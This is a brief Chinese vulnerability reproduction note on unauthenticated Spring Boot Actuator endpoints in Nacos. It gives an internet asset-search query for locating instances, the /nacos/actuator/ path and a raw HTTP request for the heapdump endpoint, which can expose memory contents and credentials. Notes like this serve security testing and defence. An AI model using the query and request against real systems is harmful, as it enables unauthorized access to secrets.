# Nacos存在Spring boot Actuator未授权漏洞

# 一、漏洞简介
<font style="color:rgb(63, 63, 63);">Nacos 是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos 提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。Nacos存在Spring boot Actuator未授权漏洞</font>

# <font style="color:rgb(51, 51, 51);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">Nacos </font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="Nacos"`
+ 特征

![1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937.png](./img/tCM8yy1R79KWVs-U/1706098466504-aee1dd64-8194-4680-a095-f9ac7f516937-922909.png)

# 四、漏洞复现
```plain
/nacos/actuator/
```

![1723181812776-57f9f2be-fd9e-4eac-9788-48ca8d2386d1.png](./img/tCM8yy1R79KWVs-U/1723181812776-57f9f2be-fd9e-4eac-9788-48ca8d2386d1-338408.png)

```plain
HEAD /nacos/actuator/heapdump HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Accept-Encoding: gzip, deflate
Accept: */*
```

![1729412390938-c97ffc26-4ec1-4ed4-b87c-0db483ad416f.png](./img/tCM8yy1R79KWVs-U/1729412390938-c97ffc26-4ec1-4ed4-b87c-0db483ad416f-308532.png)



> 更新: 2024-10-28 15:59:44  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/utanzrai31cospcx>